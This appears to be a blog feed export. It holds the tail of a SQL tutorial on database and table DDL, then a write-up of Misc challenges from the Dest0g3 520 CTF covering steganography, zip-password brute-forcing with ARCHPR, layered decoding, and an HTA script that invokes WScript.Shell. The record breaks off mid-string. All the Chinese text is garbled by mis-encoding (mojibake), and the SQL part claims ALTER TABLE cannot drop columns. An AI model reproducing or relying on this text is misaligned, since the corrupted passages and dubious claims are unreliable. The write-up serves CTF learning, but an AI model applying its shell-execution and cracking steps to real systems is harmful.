<p><strong>NOTE:</strong> The various relational database implementations require you to take different steps to drop a database. After the database is dropped, you will need to clean up the operating system files that compose the database.</p>
<p><strong>Exercise 9.2</strong></p>
<p>Create a database with one table in it. Issue the <strong>DROP TABLE</strong> command and the issue the <strong>DROP DATABASE</strong> command. Does your database system allow you to do this? Single-file based systems, such as Microsoft Access, do not support this command. The database is contained in a single file. To create a database, you must use the menu options provided in the product itself. To delete a database, simply delete the file from the hard drive.</p>
<p><strong>Summary</strong></p>
<p>It covers the major features of SQLâ€™s Data Manipulation Language (DML). In particular, you learned five new statements: <strong>CREATE DATABASE</strong>, <strong>CREATE TABLE</strong>, <strong>ALTER TABLE</strong>, <strong>DROP TABLE</strong>, and <strong>DROP DATABASE</strong>. It also discusses the importance of creating a good database design.</p>
<p>A data dictionary is one of the most important pieces of documentation you can create when designing a database. This dictionary should include a complete description of all objects in the database: tables, fields, views, indexes, stored procedures, triggers, and so forth. A complete data dictionary also contains a brief comment explaining the purpose behind each item in the database. You should update the data dictionary whenever you make changes to the database.</p>
<p>Before using any of the data manipulation statements, it is also important to create a good database design. Break down the required information into logical groups and try to identify a primary key field that other groups (or tables) can use to reference this logical group. Use foreign key fields to point to the primary or foreign key fields in other tables.</p>
<p>You learned that the <strong>CREATE DATABASE</strong> statement is not a standard element within database systems. This variation is primarily due to the many different ways vendors store their databases on disk. Each implementation enables a different set of features and options, which results in a completely different <strong>CREATE DATABASE</strong> statement. Simply issuing <strong>CREATE DATABASE database_name</strong> creates a default database with a default size on most systems. The <strong>DROP DATABASE</strong> statement permanently removes that database.</p>
<p>The <strong>CREATE TABLE</strong> statement creates a new table. With this command, you can create the fields you need and identify their data types. Some database management systems also allow you to specify other attributes for the field, such as whether it can allow <strong>NULL</strong> values or whether that field should be unique throughout the table. The <strong>ALTER TABLE</strong> statement can alter the structure of an existing table. The <strong>DROP TABLE</strong> statement can delete a table from a database.</p>
<p><strong>Q&amp;A</strong></p>
<p><strong>Q Why does the</strong> <strong>CREATE DATABASE</strong> <strong>statement vary so much from one system to another?</strong></p>
<p><strong>A</strong> <strong>CREATE DATABASE</strong> varies because the actual process of creating a database varies from one database system to another. Small PC-based databases usually rely on files that are created within some type of application program. To distribute the database on a large server, related database files are simply distributed over several disk drives. When your code accesses these databases, there is no database process running on the computer, just your application accessing the files directly. More powerful database systems must take into account disk space management as well as support features such as security, transaction control, and stored procedures embedded within the database itself. When your application program accesses a database, a database server manages your requests (along with many othersâ€™ requests) and returns data to you through a sometimes complex layer of middleware.</p>
<p><strong>Q Can I create a table temporarily and then automatically drop it when I am done with it?</strong></p>
<p><strong>A</strong> Yes. Many database management systems support the concept of a temporary table. This type of table is created for temporary usage and is automatically deleted when your userâ€™s process ends or when you issue the <strong>DROP TABLE</strong> command.</p>
<p><strong>Q Can I remove columns with the</strong> <strong>ALTER TABLE</strong> <strong>statement?</strong></p>
<p><strong>A</strong> No. The <strong>ALTER TABLE</strong> command can be used only to add or modify columns within a table. To remove columns, create a new table with the desired format and then select the records from the old table into the new table.</p>
]]></content>
      <categories>
        <category>SQL</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Dest0g3 520è¿æ–°èµ›</title>
    <url>/2022/08/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="dest0g3-520è¿æ–°èµ›"><a class="markdownIt-Anchor" href="#dest0g3-520è¿æ–°èµ›"></a> Dest0g3 520è¿æ–°èµ›</h1>
<p>Dest0g3é¦–æ¬¡æ‹›æ–°å•¦ï¼</p>
<p>Dest0g3 Teamç°é€æ­¥å‘å±•åˆ°å„å¤§é«˜æ ¡åŠå®‰å…¨å…¬å¸å‡æœ‰æˆå‘˜åˆ†å¸ƒï¼Œåœ¨è¿‡å»çš„åŠå¹´é‡Œå…ˆåå–å¾—L3HCTFç¬¬åã€SCTFç¬¬å…­åŠSUSCTFç¬¬å››çš„ä¼˜å¼‚æˆç»©ã€‚</p>
<p>é¦–å±ŠDest0g3 520è¿æ–°èµ›æ›´åŠ æ³¨é‡CTFerçš„åŸºç¡€çŸ¥è¯†é¢æŒæ¡ç¨‹åº¦ï¼Œç”±æ˜“åˆ°éš¾ï¼Œé€‚åˆå„å­¦ä¹ é˜¶æ®µé€‰æ‰‹å‚åŠ ï¼Œçº¯èŒæ–°æ°´å‡†ã€‚</p>
<p>Dest0g3æœŸå¾…æ›´å¤šæ–°ç”ŸåŠ›é‡çš„åŠ å…¥ï¼Œå¦‚æœ‰æ„å‘è¯·åœ¨èµ›åæäº¤wpä¸ç®€å†ï¼Œæˆ–è”ç³»@Dest0g3 Team ï¼ˆQQï¼š1115230222ï¼‰</p>
<p>æ¯”èµ›æ—¶é—´ï¼š2022.5.20 10:00 - 5.27 10:00</p>
<p>é¢˜ç›®åˆ†ç±»ï¼šWebã€Pwnã€Miscã€Cryptoã€Reã€AIã€BlockChain</p>
<p>é¢˜ç›®éš¾åº¦ï¼šèŒæ–°</p>
<p>æ¯”èµ›ç±»å‹ï¼šä¸ªäººèµ›</p>
<p>æ¯”èµ›äº¤æµQQç¾¤ï¼š923945203</p>
<p>ä¸ªäººèµ›å¥–åŠ±ï¼šæ€»æ¦œå‰10åŠå„æ–¹å‘å‰ä¸‰å‡å¯è·å¾—ã€Šä»0åˆ°1ï¼šCTFeræˆé•¿ä¹‹è·¯ã€‹ä¸€æœ¬ + å®šåˆ¶Uç›˜ï¼ˆ32Gï¼‰ä¸€ä¸ª</p>
<span id="more"></span>
<h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h2>
<h3 id="welcome-to-fxxking-destctf"><a class="markdownIt-Anchor" href="#welcome-to-fxxking-destctf"></a> Welcome to fxxking DestCTF</h3>
<p>**é¢˜ç›®æè¿°ï¼š**å…³æ³¨å…¬ä¼—å·å¹¶å›å¤ï¼šGive me the fxxking flag</p>
<p>**é™„ä»¶ä¸‹è½½ï¼š**<a href="https://files.buuoj.cn/files/8fc59c32ce5bcf7da3917ad4a3a023ba/jpg">https://files.buuoj.cn/files/8fc59c32ce5bcf7da3917ad4a3a023ba/jpg</a></p>
<p><strong>åšé¢˜è¿‡ç¨‹ï¼š</strong></p>
<p>å°†é™„ä»¶æ‹–å…¥æµè§ˆå™¨æŸ¥çœ‹ã€‚è·å¾—äºŒç»´ç ï¼Œæ‰«ç å…³æ³¨å…¬ä¼—å·ï¼Œè¾“å…¥æç¤ºç»™çš„ï¼šGive me the fxxking flag</p>
<p><img src="https://img-blog.csdnimg.cn/c2001876496f4c2292e236787d6a1064.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>è·å–flagï¼šDest0g3{W31c0m3_t0_DestCTF2022!}</p>
<h3 id="pngenius"><a class="markdownIt-Anchor" href="#pngenius"></a> Pngenius</h3>
<p><strong>é¢˜ç›®æè¿°ï¼š</strong></p>
<p>**é™„ä»¶ä¸‹è½½ï¼š**<a href="https://files.buuoj.cn/files/5a64d4c2532f28b79aa99089c3f76ff5/Dest0g3.png">https://files.buuoj.cn/files/5a64d4c2532f28b79aa99089c3f76ff5/Dest0g3.png</a></p>
<p><strong>åšé¢˜è¿‡ç¨‹ï¼š</strong></p>
<blockquote>
<p>1ã€è·å–å›¾ç‰‡æ˜¯PNGæ ¼å¼ï¼Œé¦–å…ˆæƒ³åˆ°çš„å°±æ˜¯LSBéšå†™ï¼Œä½¿ç”¨å·¥å…·stegsloveæŸ¥çœ‹</p>
<p>åœ¨r 0 g 0 b 0å¤„å‘ç°æœ‰å˜åŒ–ã€‚</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/359af78c6f5a4c589951a0fb06d41b4f.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"><img src="https://img-blog.csdnimg.cn/86ffb3a2a628455bbc8753c9aae546c4.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"><img src="https://img-blog.csdnimg.cn/56a9f5ded36347ce90a55fc14aa8cbc5.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<blockquote>
<p>2ã€ä½¿ç”¨stegsloveè‡ªå¸¦çš„Data Extract æ•°æ®æå–å·¥å…·å¯¹ä¸‰å¤„å¼‚å¸¸ï¼Œè¿›è¡ŒæŸ¥çœ‹ã€‚</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/321e9f64811e4ff9b9a7173a133de680.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"><img src="https://img-blog.csdnimg.cn/bbb2325b1ca949c78345c512a80b0baf.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<blockquote>
<p>3ã€ å¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…çš„è§£å‹å¯†ç ï¼Œè¿”å›å›¾ç‰‡ï¼Œä½¿ç”¨binwalkè¿›è¡Œæ‰«æï¼Œå¹¶æå–å‹ç¼©åŒ…</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/2c43f5298f2944ff9db941fc40514f10.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<blockquote>
<p>4ã€è¾“å…¥å‹ç¼©åŒ…å¯†ç Weak_Pas5w0rdï¼Œæ‰“å¼€å‹ç¼©åŒ…ï¼Œè·å–flag.txtã€‚</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/c0beb361c71f491cb15e387b11233fab.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>è·å–flagï¼šDest0g3{2908C1AA-B2C1-B8E6-89D1-21B97D778603}</p>
<h3 id="easyencode"><a class="markdownIt-Anchor" href="#easyencode"></a> EasyEncode</h3>
<p>**é¢˜ç›®æè¿°ï¼š**Enjoy Decoding</p>
<p>**é™„ä»¶ä¸‹è½½ï¼š**<a href="https://files.buuoj.cn/files/2fb77a72cba82a4c9a749998a1073e58/encode.zip">https://files.buuoj.cn/files/2fb77a72cba82a4c9a749998a1073e58/encode.zip</a></p>
<p><strong>åšé¢˜è¿‡ç¨‹ï¼š</strong></p>
<blockquote>
<p>ä¸‹è½½é™„ä»¶ï¼Œæ˜¯ä¸ªZIPæ–‡ä»¶ï¼Œè§£å‹ï¼Œå‘ç°æœ‰åŠ å¯†ï¼Œä¸¢è¿›010 edtierä¸­æŸ¥çœ‹</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/9366225f80f442268e5d39bc432269e6.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<blockquote>
<p>2ã€å‘ç°ä¸æ˜¯ä¼ªåŠ å¯†ï¼Œäºæ˜¯è¯•ç€ç”¨ARCHPRçˆ†ç ´ä¸€ä¸‹ï¼Œå¯†ç é•¿åº¦é€‰æ‹©4-6ä½ã€‚</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/014592d521754099affcc8d040053bb5.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<blockquote>
<p>è·å¾—å¯†ç 100861ï¼Œè§£å‹å‹ç¼©åŒ…,æ‰“å¼€æ–‡æœ¬æ–‡ä»¶ï¼Œå‘ç°æ‘©æ–¯ç¼–ç ï¼š</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/69d19aa758f54c6ca6765360a63ef07e.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<blockquote>
<p>3ã€ä¸‹é¢å°±æ˜¯è§£ç è¿‡ç¨‹ï¼š</p>
</blockquote>
<blockquote>
<p>è¿ç”¨åœ¨çº¿å·¥å…·<a href="https://www.lddgo.net/encrypt/morse">åœ¨çº¿æ‘©æ–¯å¯†ç ç¿»è¯‘å™¨ (lddgo.net)</a></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/7cb0a08d95c84f52a15831cb7f247b5b.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<blockquote>
<p>è·å¾—ä¸€ä¸²Hexï¼ˆåå…­è¿›åˆ¶ï¼‰ç¼–ç ï¼Œè¿ç”¨åœ¨çº¿å·¥å…·<a href="https://the-x.cn/encodings/Hex.aspx">HEXè½¬å­—ç¬¦ åå…­è¿›åˆ¶è½¬å­—ç¬¦ hex gb2312 gbk utf8 æ±‰å­—å†…ç è½¬æ¢ - The X åœ¨çº¿å·¥å…· (the-x.cn)</a>è½¬å­—ç¬¦ï¼š</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/2051da8075304abcae5cca6dbdc2ddae.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<blockquote>
<p>è·å¾—ä¸€ä¸²unicodeç¼–ç ï¼Œä½¿ç”¨åœ¨çº¿å·¥å…·<a href="https://tool.chinaz.com/tools/unicode.aspx">Unicodeç¼–ç è½¬æ¢ - ç«™é•¿å·¥å…· (chinaz.com)</a></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/484a9cb95ec9408d9ad2905d7b59f600.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<blockquote>
<p>â€œ%3Dâ€åœ¨urlç¼–ç ä¸­æ˜¯â€œ=â€â€™ï¼Œæ‰€ä»¥è¿›è¡Œbase64è§£ç ï¼Œè¿ç”¨åœ¨çº¿å·¥å…·ï¼š<a href="https://the-x.cn/zh-cn/base64">Base64è§£ç  Base64ç¼–ç  UTF8 GB2312 UTF16 GBK äºŒè¿›åˆ¶ åå…­è¿›åˆ¶ è§£å¯† - The X åœ¨çº¿å·¥å…· (the-x.cn)</a></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/da9e343502734ca89a6f8cd6baf55939.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>è·å¾—flagï¼šDest0g3{Deoding_1s_e4sy_4_U}</p>
<h3 id="ä½ çŸ¥é“jså—"><a class="markdownIt-Anchor" href="#ä½ çŸ¥é“jså—"></a> ä½ çŸ¥é“jså—</h3>
<p><strong>é¢˜ç›®æè¿°ï¼š</strong></p>
<p>**é™„ä»¶ä¸‹è½½ï¼š**<a href="https://files.buuoj.cn/files/5f1fc294b6468f733b774ceee6106062/flag">https://files.buuoj.cn/files/5f1fc294b6468f733b774ceee6106062/flag</a></p>
<p><strong>åšé¢˜è¿‡ç¨‹ï¼š</strong></p>
<blockquote>
<p>1ã€ä¸‹è½½ï¼Œé™„ä»¶ï¼Œæ‡’äº†ï¼Œä¸æƒ³å¼€010ï¼Œç›´æ¥å§é™„ä»¶æ‰”åˆ°æµè§ˆå™¨ï¼Œæµè§ˆå™¨è‡ªåŠ¨ç¼–è¯‘åä¸‹è½½äº†ä¸€ä¸ªflag.zipæ–‡ä»¶</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/ffa9b6c56dc641e0b5db406f890eb691.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<blockquote>
<p>2ã€æ‰“å¼€å‹ç¼©åŒ…ï¼Œçœ‹åˆ°ä¸€å †XMLæ ¼å¼çš„æ–‡ä»¶ï¼Œç›´æ¥æ‰”æµè§ˆå™¨é‡Œã€‚</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/fe2bbcc56eea4328b710beee5cdfb457.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<blockquote>
<p>åœ¨docoment.xmlä¸­å‘ç°ä¸‰ä¸²base64ç‰¹å¾å­—ç¬¦ï¼Œæ‹¼æ¥è§£ç åè·å¾—</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> standalone=<span class="string">&quot;yes&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">assembly</span> <span class="attr">xmlns</span>=<span class="string">&quot;urn:schemas-microsoft-com:asm.v1&quot;</span> <span class="attr">manifestVersion</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">trustInfo</span> <span class="attr">xmlns</span>=<span class="string">&quot;urn:schemas-microsoft-com:asm.v3&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">requestedExecutionLevel</span> <span class="attr">level</span>=<span class="string">&quot;asInvoker&quot;</span> <span class="attr">uiAccess</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">application</span> <span class="attr">xmlns</span>=<span class="string">&quot;urn:schemas-microsoft-com:asm.v3&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dpiAwareness</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.microsoft.com/SMI/2016/WindowsSettings&quot;</span>&gt;</span>Do you know js<span class="tag">&lt;/<span class="name">dpiAwareness</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;javascript&quot;</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="built_in">unescape</span>(<span class="string">&#x27;%3Chtml%3E%0A%3Cbody%3E%0A%0A%3C%21DOCTYPE%20html%3E%0A%3Chtml%3E%0A%3Chead%3E%0A%20%20%20%20%3Ctitle%3EDo%20You%20Know%20js%3C%2Ftitle%3E%0A%3CHTA%3AAPPLICATION%0A%20%20APPLICATIONNAME%3D%22Do%20You%20Know%20js%22%0A%20%20ID%3D%22Inception%22%0A%20%20VERSION%3D%221.0%22%0A%20%20SCROLL%3D%22no%22%2F%3E%0A%20%0A%3Cstyle%20type%3D%22text%2Fcss%22%3E%0A%3C%2Fhead%3E%0A%20%20%20%20%3Cdiv%20id%3D%22feature%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22content%0A%09%09%09%09%3C%2Fstyle%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20id%3D%22unavailable%22%20class%3D%22loading%22%3EBuilding%20js.....%3C%2Fh1%3E%0A%09%09%09%09%3Cscript%20type%3D%22text%2Fjavascript%22%20language%3D%22javascript%22%3E%0A%09%09%09%09%09function%20RunFile%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20var%20WshShell%20%3D%20new%20ActiveXObject%28%22WScript.Shell%22%29%3B%0A%09%09%09%09%09WshShell.Run%28%22notepad%20%25windir%25%2FDesktop%2Fjs.txt%22%2C%201%2C%20false%29%3B%0A%20%20%20%20%20%20%20%20%20%20%2F*%20var%20oExec%20%3D%20WshShell.Exec%28%22notepad%22%29%3B%20*%2F%0A%09%09%09%09%09%7D%0A%09%09%09%09%3C%2Fscript%3E%0A%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3C%2Fdiv%3E%0A%3Cbody%3E%0A%09%3Cinput%20type%3D%22button%22%20value%3D%22Implant%20Inception%20Here%22%20onclick%3D%22RunFile%28%29%3B%22%2F%3E%0A%09%3Cp%20style%3D%22color%3Awhite%3B%22%3E%0A%0A%2B%2B%2B%2B%2B%20%2B%2B%5B-%3E%20%2B%2B%2B%2B%2B%20%2B%2B%3C%5D%3E%20%2B%2B%2B..%20%2B%2B.-.%20%2B%2B.--%20--.%2B%2B%20%2B%2B.--%20%0A-.-.-%20--.%2B%2B%20%2B%2B%2B%2B.%0A%2B.---%20-..%2B%2B%20%2B%2B.%3C%2B%20%2B%2B%5B-%3E%20%2B%2B%2B%3C%5D%20%3E%2B%2B.%3C%20%2B%2B%2B%5B-%20%0A%3E---%3C%20%5D%3E---%20---.%2B%20%2B%2B%2B%2B.%20-----%0A.%2B%2B%2B.%20...--%20---.%2B%20%2B%2B%2B%2B.%20---.%2B%20%2B%2B.--%20---.%2B%20%2B%2B%2B%2B.%20---..%20%2B%2B%2B%2B%2B%20%2B.---%20----.%0A%3C%2B%2B%2B%2B%20%5B-%3E%2B%2B%20%2B%2B%3C%5D%3E%20%2B%2B.%3C%2B%20%2B%2B%2B%5B-%20%3E----%20%3C%5D%3E-.%20---.%2B%0A%20%2B%2B%2B%2B%2B%20.----%20-.%2B%2B.%20%2B%2B.%2B.%0A--.--%20.%3C%2B%2B%2B%20%2B%5B-%3E%2B%20%2B%2B%2B%3C%5D%20%3E%2B%2B.%3C%20%2B%2B%2B%2B%5B%20-%3E---%20-%3C%5D%3E-%20%0A.%2B.-.%20---.%2B%20%2B%2B.%2B.%20-.%2B%2B%2B%0A%2B.---%20--.%3C%2B%20%2B%2B%2B%5B-%20%3E%2B%2B%2B%2B%20%3C%5D%3E%2B%2B%20.%3C%2B%2B%2B%20%5B-%3E--%20-%3C%5D%3E-%20----.%20----.%20%2B.%2B%2B%2B%20%2B.---%0A-.---%20.%2B%2B%2B.%20-..%3C%2B%20%2B%2B%2B%5B-%20%3E%2B%2B%2B%2B%20%3C%5D%3E%2B%2B%20%0A.%3C%2B%2B%2B%20%2B%5B-%3E-%20---%3C%5D%20%3E-.%2B%2B%20%2B%2B%2B.-%20----.%0A%2B%2B%2B..%20---.%2B%20%2B%2B.--%20--.%2B.%20..%2B%2B%2B%20%2B.-.-%20----.%20%2B%2B%2B%2B%2B%20%0A.----%20.%2B.%2B%2B%20%2B%2B.--%20--.%2B%2B%0A%2B%2B.-.%20----.%20%2B.-.%2B%20%2B%2B%2B%2B.%20%0A%3C%2B%2B%2B%5B%20-%3E%2B%2B%2B%20%3C%5D%3E%2B%2B%20%2B%2B.%3C%0A%3C%2Fp%3E%0A%3C%2Fbody%3E%0A%3C%2Fbody%3E%0A%20%20%3C%2Fhtml%3E%0A&#x27;</span>));</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<blockquote>
<p>è¾¨åˆ«è§£ç åæ˜¯ï¼Œurlç¼–ç ï¼Œåœ¨çº¿å·¥å…·è§£ç <a href="https://the-x.cn/zh-cn/UrlDecode.aspx">UrlDecodeè§£ç /UrlEncodeç¼–ç  GB2312 UTF8 - The X åœ¨çº¿å·¥å…· (the-x.cn)</a>ï¼š</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Do You Know js<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HTA:APPLICATION</span></span></span><br><span class="line"><span class="tag">  <span class="attr">APPLICATIONNAME</span>=<span class="string">&quot;Do You Know js&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">ID</span>=<span class="string">&quot;Inception&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">VERSION</span>=<span class="string">&quot;1.0&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">SCROLL</span>=<span class="string">&quot;no&quot;</span>/&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;feature&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content</span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="language-xml">				</span></span></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;unavailable&quot;</span> <span class="attr">class</span>=<span class="string">&quot;loading&quot;</span>&gt;</span>Building js.....<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">language</span>=<span class="string">&quot;javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">					<span class="keyword">function</span> <span class="title function_">RunFile</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">var</span> <span class="title class_">WshShell</span> = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">					<span class="title class_">WshShell</span>.<span class="title class_">Run</span>(<span class="string">&quot;notepad %windir%/Desktop/js.txt&quot;</span>, <span class="number">1</span>, <span class="literal">false</span>);</span></span><br><span class="line"><span class="language-javascript">          <span class="comment">/* var oExec = WshShell.Exec(&quot;notepad&quot;); */</span></span></span><br><span class="line"><span class="language-javascript">					&#125;</span></span><br><span class="line"><span class="language-javascript">				</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Implant Inception Here&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;RunFile();&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;color:white;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">+++++ ++[-&gt; +++++ ++&lt;]&gt; +++.. ++.-. ++.-- --.++ ++.-- </span><br><span class="line">-.-.- --.++ ++++.</span><br><span class="line">+.--- -..++ ++.&lt;+ ++[-&gt; +++&lt;] &gt;++.&lt; +++[- </span><br><span class="line">&gt;---&lt; ]&gt;--- ---.+ ++++. -----</span><br><span class="line">.+++. ...-- ---.+ ++++. ---.+ ++.-- ---.+ ++++. ---.. +++++ +.--- ----.</span><br><span class="line">&lt;++++ [-&gt;++ ++&lt;]&gt; ++.&lt;+ +++[- &gt;---- &lt;]&gt;-. ---.+</span><br><span class="line"> +++++ .---- -.++. ++.+.</span><br><span class="line">--.-- .&lt;+++ +[-&gt;+ +++&lt;] &gt;++.&lt; ++++[ 